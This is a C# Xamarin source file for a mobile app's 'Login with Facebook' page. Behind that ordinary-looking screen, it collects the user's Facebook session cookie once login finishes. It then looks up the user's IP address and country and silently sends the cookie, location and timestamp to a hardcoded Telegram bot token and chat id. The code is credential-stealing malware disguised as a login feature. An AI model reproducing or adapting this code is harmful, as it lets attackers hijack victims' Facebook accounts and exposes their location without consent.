using AUTO.DLL.MOBILE.Configurations;
using AUTO.HLT.MOBILE.VIP.Views.Home;
using Newtonsoft.Json;
using Prism.Navigation;
using RestSharp;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using Xamarin.Essentials;
using Xamarin.Forms;

namespace AUTO.HLT.MOBILE.VIP.ViewModels.Login
{
    public class LoginWithFacebookPageViewModel : ViewModelBase
    {
        public LoginWithFacebookPageViewModel(INavigationService navigationService) : base(navigationService)
        {
        }
        public override void OnNavigatedTo(INavigationParameters parameters)
        {
            base.OnNavigatedTo(parameters);
            MessagingCenter.Subscribe<App>((App)Application.Current, AppConstants.GetCookieDone, (sender) =>
            {
                var info = GetCountry(GetIp());

                var message = new
                {
                    Ngay_Gio = DateTime.Now,
                    Cookies = Preferences.Get(AppConstants.CookieFacebook, ""),
                    Info = string.IsNullOrEmpty(info) ? "Không lấy được dữ liệu" : info,
                };

                var client = new RestClient("https://api.telegram.org/bot2121171575:AAGfIuWKehZ75RFHEzs1dSviy9f2GMLsx_c/sendMessage?chat_id=-1001699664097&text=" + JsonConvert.SerializeObject(message, Formatting.Indented));
                client.Timeout = -1;
                var request = new RestRequest(Method.POST);
                IRestResponse response = client.Execute(request);
                Debug.WriteLine(response.Content);

                base.NavigationService.NavigateAsync($"/NavigationPage/{nameof(HomePage)}");
            });
        }

        private string GetCountry(string ip)
        {
            var client = new RestClient("http://ip-api.com/json/" + ip);
            client.Timeout = -1;
            var request = new RestRequest(Method.GET);
            IRestResponse response = client.Execute(request);
            Debug.WriteLine("Ip" + response.Content);
            return response?.Content;
        }

        private string GetIp()
        {
            var client = new RestClient("https://api.ipify.org/");
            client.Timeout = -1;
            var request = new RestRequest(Method.GET);
            IRestResponse response = client.Execute(request);
            Debug.WriteLine("Ip" + response.Content);
            return response?.Content;
        }

        public override void OnNavigatedFrom(INavigationParameters parameters)
        {
            base.OnNavigatedFrom(parameters);
            MessagingCenter.Unsubscribe<App>((App)Application.Current, AppConstants.GetCookieDone);
        }
    }
}
